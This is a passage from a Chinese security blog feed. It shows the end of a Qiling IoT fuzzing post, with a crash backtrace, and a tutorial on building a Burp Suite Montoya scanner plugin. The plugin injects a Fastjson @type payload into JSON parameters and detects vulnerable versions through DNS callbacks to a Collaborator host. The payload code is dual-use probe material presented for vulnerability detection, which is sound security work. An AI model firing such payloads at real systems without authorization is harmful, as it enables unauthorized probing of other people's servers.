punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h3><p>同样写个脚本把服务并且设置debugger等待gdb连接：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230130/image-20221213143927097.6wze3o97x280.png" alt="image-20221213143927097"></p><p>然后将crash中的数据发送：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230130/image-20221213144007558.8e078zxvleo.png" alt="image-20221213144007558"></p><p>也确实触发到了漏洞：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x900a5d74 <span class="token keyword">in</span> strncpy <span class="token punctuation">(</span><span class="token punctuation">)</span> from target:/lib/libc.so.0gef➤  backtrace <span class="token comment">#0  0x900a5d74 in strncpy () from target:/lib/libc.so.0</span><span class="token comment">#1  0x0001853c in ?? ()</span>Backtrace stopped: previous frame identical to this frame <span class="token punctuation">(</span>corrupt stack?<span class="token punctuation">)</span>gef➤  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><p>fuzz过程中不好调试连写的harness有没有效果都不知道，可以使用capstone同步解析执行汇编情况：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">def simple_diassembler(ql: Qiling, address: int, size: int, md: Cs) -&gt; None:    buf = ql.mem.read(address, size)    for insn in md.disasm(buf, address):        ql.log.debug(f':: {insn.address:#x} : {insn.mnemonic:24s} {insn.op_str}')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://docs.qiling.io/en/latest/demo/">Demo - Qiling Framework Documentation</a></li><li><a href="https://blog.csdn.net/jazrynwong/article/details/117228447">IOT Fuzz 两种思路</a></li><li><a href="https://www.anquanke.com/post/id/185336#h2-2">vivetok 摄像头远程栈溢出漏洞分析-安全客 - 安全资讯平台 (anquanke.com)</a></li><li><a href="https://xz.aliyun.com/t/5054">Vivotek远程栈溢出漏洞分析与复现 - 先知社区 (aliyun.com)</a></li><li><a href="http://galaxylab.com.cn/%e5%9f%ba%e4%ba%8eunicorn%e5%92%8clibfuzzer%e7%9a%84%e6%a8%a1%e6%8b%9f%e6%89%a7%e8%a1%8cfuzzing/">http://galaxylab.com.cn/%e5%9f%ba%e4%ba%8eunicorn%e5%92%8clibfuzzer%e7%9a%84%e6%a8%a1%e6%8b%9f%e6%89%a7%e8%a1%8cfuzzing/</a></li><li><a href="http://galaxylab.pingan.com.cn/%E5%9F%BA%E4%BA%8E-unicorn-%E7%9A%84%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C%E5%92%8C-fuzzer-%E5%AE%9E%E7%8E%B0/">http://galaxylab.pingan.com.cn/%E5%9F%BA%E4%BA%8E-unicorn-%E7%9A%84%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C%E5%92%8C-fuzzer-%E5%AE%9E%E7%8E%B0/</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;qiling-框架IotFuzz之Boa&quot;&gt;&lt;a href=&quot;#qiling-框架IotFuzz之Boa&quot; class=&quot;headerlink&quot; title=&quot;qiling 框架IotFuzz之Boa&quot;&gt;&lt;/a&gt;qiling 框架IotFuzz之Boa&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="Fuzz" scheme="https://rainsec.cn/categories/Fuzz/"/>
    
    
    <category term="Fuzz" scheme="https://rainsec.cn/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>Burp-Montoya</title>
    <link href="https://rainsec.cn/post/Burp-Montoya.html"/>
    <id>https://rainsec.cn/post/Burp-Montoya.html</id>
    <published>2022-11-01T04:38:45.000Z</published>
    <updated>2023-04-12T02:36:51.327Z</updated>
    
    <content type="html"><![CDATA[<p>  Burp的新版本更新了新的<code>API</code>接口，刚好最近有写插件的想法，所以简单的了解了下。</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20221101/images.4m31nsvvgdc0.png" alt="images"></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>  单从文档界面来看，结构清晰了不少-&gt;<a href="https://portswigger.github.io/burp-extensions-montoya-api/javadoc/burp/api/montoya/MontoyaApi.html">MontoyaApi</a></p><p><img src="https://wiki-1258274765.cos.ap-nanjing.myqcloud.com/wiki/img20221030132718.png"></p><p>  同时官方提供了一个<a href="https://github.com/PortSwigger/burp-extender-montoya-api">demo</a></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>  与老版本类似，创建一个插件项目需要继承类<code>BurpExtension</code>，它只包含了一个初始化函数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">BurpExtension</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token class-name">MontoyaApi</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  同样的，想要调用扫描等功能，也需要进行注册，比如我们注册一个扫描</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token class-name">MontoyaApi</span> montoyaApi<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>montoyaApi <span class="token operator">=</span> montoyaApi<span class="token punctuation">;</span>    montoyaApi<span class="token punctuation">.</span><span class="token function">scanner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">registerScanCheck</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FastjsonCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FastjsonCheck</span> <span class="token keyword">implements</span> <span class="token class-name">ScanCheck</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">AuditIssue</span><span class="token punctuation">&gt;</span></span> <span class="token function">activeAudit</span><span class="token punctuation">(</span><span class="token class-name">HttpRequestResponse</span> httpRequestResponse<span class="token punctuation">,</span> <span class="token class-name">AuditInsertionPoint</span> auditInsertionPoint<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">AuditIssue</span><span class="token punctuation">&gt;</span></span> <span class="token function">passiveAudit</span><span class="token punctuation">(</span><span class="token class-name">HttpRequestResponse</span> httpRequestResponse<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">ConsolidationAction</span> <span class="token function">consolidateIssues</span><span class="token punctuation">(</span><span class="token class-name">AuditIssue</span> auditIssue<span class="token punctuation">,</span> <span class="token class-name">AuditIssue</span> auditIssue1<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  与之前类似，<code>activeAudit</code>主动，<code>passiveAudit</code>被动，<code>consolidateIssues</code>定义重复问题的展示规则。<br>具体扫描逻辑与旧版本就大同小异了，不过新版本调用某些方法变得更加方便了，比如调用<code>collaborator</code>:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">CollaboratorClient</span> collaboratorClient <span class="token operator">=</span> montoyaApi<span class="token punctuation">.</span><span class="token function">collaborator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//生成域名链接</span><span class="token class-name">String</span> payload <span class="token operator">=</span> collaboratorClient<span class="token punctuation">.</span><span class="token function">generatePayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//访问域名操作</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">//检查记录</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Interaction</span><span class="token punctuation">&gt;</span></span> interactions <span class="token operator">=</span> collaboratorClient<span class="token punctuation">.</span><span class="token function">getAllInteractions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  报告的展示与旧版本基本相同，感觉只是变了名称</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">burp<span class="token punctuation">.</span>api<span class="token punctuation">.</span>montoya<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpService</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">burp<span class="token punctuation">.</span>api<span class="token punctuation">.</span>montoya<span class="token punctuation">.</span>http<span class="token punctuation">.</span>message<span class="token punctuation">.</span></span><span class="token class-name">MarkedHttpRequestResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">burp<span class="token punctuation">.</span>api<span class="token punctuation">.</span>montoya<span class="token punctuation">.</span>scanner<span class="token punctuation">.</span>audit<span class="token punctuation">.</span>issues<span class="token punctuation">.</span></span><span class="token class-name">AuditIssue</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">burp<span class="token punctuation">.</span>api<span class="token punctuation">.</span>montoya<span class="token punctuation">.</span>scanner<span class="token punctuation">.</span>audit<span class="token punctuation">.</span>issues<span class="token punctuation">.</span></span><span class="token class-name">AuditIssueConfidence</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">burp<span class="token punctuation">.</span>api<span class="token punctuation">.</span>montoya<span class="token punctuation">.</span>scanner<span class="token punctuation">.</span>audit<span class="token punctuation">.</span>issues<span class="token punctuation">.</span></span><span class="token class-name">AuditIssueDefinition</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">burp<span class="token punctuation">.</span>api<span class="token punctuation">.</span>montoya<span class="token punctuation">.</span>scanner<span class="token punctuation">.</span>audit<span class="token punctuation">.</span>issues<span class="token punctuation">.</span></span><span class="token class-name">AuditIssueSeverity</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span><span class="token comment">/** * @program: BurpMontoya * @description: * @author: Noel * @create: 2022-09-21 01:35 **/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExampleAudit</span> <span class="token keyword">implements</span> <span class="token class-name">AuditIssue</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> detail<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">HttpService</span> httpService<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">MarkedHttpRequestResponse</span><span class="token punctuation">[</span><span class="token punctuation">]</span> requestResponses<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">AuditIssueConfidence</span> confidence<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">AuditIssueSeverity</span> severity<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> baseurl<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">ExampleAudit</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> detail<span class="token punctuation">,</span> <span class="token class-name">HttpService</span> httpService<span class="token punctuation">,</span> <span class="token class-name">MarkedHttpRequestResponse</span><span class="token punctuation">[</span><span class="token punctuation">]</span> requestResponses<span class="token punctuation">,</span> <span class="token class-name">AuditIssueSeverity</span> severity<span class="token punctuation">,</span> <span class="token class-name">AuditIssueConfidence</span> confidence<span class="token punctuation">,</span> <span class="token class-name">String</span> baseurl<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>detail <span class="token operator">=</span> detail<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>httpService <span class="token operator">=</span> httpService<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponses <span class="token operator">=</span> requestResponses<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>severity <span class="token operator">=</span> severity<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>confidence <span class="token operator">=</span> confidence<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>baseurl <span class="token operator">=</span> baseurl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">detail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> detail<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">remediation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">HttpService</span> <span class="token function">httpService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> httpService<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">baseUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> baseurl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">AuditIssueSeverity</span> <span class="token function">severity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> severity<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">AuditIssueConfidence</span> <span class="token function">confidence</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> confidence<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">MarkedHttpRequestResponse</span><span class="token punctuation">&gt;</span></span> <span class="token function">requestResponses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>requestResponses<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">AuditIssueDefinition</span> <span class="token function">definition</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  这些结合起来便可以完成一个<code>Burp</code>插件的开发了</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>  前段时间出了<code>Fastjson 1.2.80</code>的利用与检测方式，刚好我们拿来做一个<code>Fastjson</code>检测的插件,<code>payload</code>如下:</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span>    <span class="token punctuation">{</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Exception"</span><span class="token punctuation">,</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.alibaba.fastjson.JSONException"</span><span class="token punctuation">,</span><span class="token property">"x"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.net.InetSocketAddress"</span><span class="token punctuation">{</span><span class="token property">"address"</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"80.DNS"</span><span class="token punctuation">}</span> <span class="token comment">//  fastjson &lt; 1.2.83</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Exception"</span><span class="token punctuation">,</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.alibaba.fastjson.JSONException"</span><span class="token punctuation">,</span><span class="token property">"message"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.net.InetSocketAddress"</span><span class="token punctuation">{</span><span class="token property">"address"</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"83_.DNS"</span><span class="token punctuation">}</span> <span class="token comment">// fastjson = 1.2.83</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  如果 <code>fastjson</code>版本低于<code>1.2.83</code>，<code>DNS</code>只会收到一个<code>80</code>开头的请求，方便我们进行版本判断。我们的检测思路就是遇到<code>json</code>格式的<code>body</code>或者<code>param</code>就全部替换为<code>payload</code>，具体操作如下：</p><ol><li>获取请求详情</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HttpRequest</span> request <span class="token operator">=</span> httpRequestResponse<span class="token punctuation">.</span><span class="token function">httpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>获取参数<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ParsedHttpParameter</span><span class="token punctuation">&gt;</span></span> parameters <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">parameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>判断参数值是否为<code>json</code>格式</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//utilities.urlUtils包含了对URL处理的函数，这里使用了decode，对URL进行解码</span>utilities<span class="token punctuation">.</span><span class="token function">urlUtils</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"{"</span><span class="token punctuation">)</span> <span class="token operator">||</span>utilities<span class="token punctuation">.</span><span class="token function">urlUtils</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>生成<code>collaboratorClient</code>并发送请求</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//生成collaborator链接</span><span class="token class-name">String</span> payload <span class="token operator">=</span> collaboratorClient<span class="token punctuation">.</span><span class="token function">generatePayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// poc</span><span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token class-name">Fastjson_Payload</span> <span class="token operator">=</span> <span class="token string">"[\n"</span> <span class="token operator">+</span>        <span class="token string">"    {\n"</span> <span class="token operator">+</span>        <span class="token string">"        \"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\n"</span> <span class="token operator">+</span>        <span class="token string">"\t\t\"x\":{\n"</span> <span class="token operator">+</span>        <span class="token string">"\t\t\t\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"fastjson80.%s\"} \n"</span> <span class="token operator">+</span>        <span class="token string">"\t\t}\n"</span> <span class="token operator">+</span>        <span class="token string">"    },\n"</span> <span class="token operator">+</span>        <span class="token string">"    {\n"</span> <span class="token operator">+</span>        <span class="token string">"        \"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\n"</span> <span class="token operator">+</span>        <span class="token string">"\t\t\"message\":{\n"</span> <span class="token operator">+</span>        <span class="token string">"\t\t\t\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"fastjson83.%s\"} \n"</span> <span class="token operator">+</span>        <span class="token string">"\t\t}\n"</span> <span class="token operator">+</span>        <span class="token string">"    }\n"</span> <span class="token operator">+</span>        <span class="token string">"]"</span><span class="token punctuation">;</span><span class="token comment">//更新参数为我们的poc</span><span class="token class-name">HttpRequest</span> rq <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">withUpdatedParameters</span><span class="token punctuation">(</span><span class="token class-name">HttpParameter</span><span class="token punctuation">.</span><span class="token function">parameter</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>utilities<span class="token punctuation">.</span><span class="token function">urlUtils</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token class-name">Fastjson_Payload</span><span class="token punctuation">,</span> payload<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//发送请求</span><span class="token class-name">HttpRequestResponse</span> httpRequestResponse1 <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">issueRequest</span><span class="token punctuation">(</span>rq<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>判断<code>dns</code>中是否包含有<code>fastjson83</code></li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 获取Collaborator服务器中所有与payload有关的请求信息</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Interaction</span><span class="token punctuation">&gt;</span></span> interactions <span class="token operator">=</span> collaboratorClient<span class="token punctuation">.</span><span class="token function">getInteractions</span><span class="token punctuation">(</span><span class="token class-name">InteractionFilter</span><span class="token punctuation">.</span><span class="token function">interactionPayloadFilter</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Interaction</span> i <span class="token operator">:</span>interactions<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// i.dnsDetails()获取一个DnsDetails的Optional对象，DnsDetails有两个方法，一个是获取dns查询的byte数组 d.query()</span><span class="token comment">// 利用byteUtils().indexOf查询是否包含fastjson83</span>    flag <span class="token operator">=</span> i<span class="token punctuation">.</span><span class="token function">dnsDetails</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>d <span class="token operator">-&gt;</span>            utilities<span class="token punctuation">.</span><span class="token function">byteUtils</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> utilities<span class="token punctuation">.</span><span class="token function">byteUtils</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">convertFromString</span><span class="token punctuation">(</span><span class="token string">"fastjson83"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span>    <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>问题展示</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ExampleAudit</span> auditIssue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExampleAudit</span><span class="token punctuation">(</span><span class="token string">"Example"</span><span class="token punctuation">,</span> <span class="token string">"Example detail"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">httpService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">MarkedHttpRequestResponse</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>httpRequestResponse<span class="token punctuation">.</span><span class="token function">withNoMarkers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> httpRequestResponse1<span class="token punctuation">.</span><span class="token function">withNoMarkers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token class-name">AuditIssueSeverity</span><span class="token punctuation">.</span>HIGH<span class="token punctuation">,</span> <span class="token class-name">AuditIssueConfidence</span><span class="token punctuation">.</span>CERTAIN<span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>auditIssues<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>auditIssue<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" 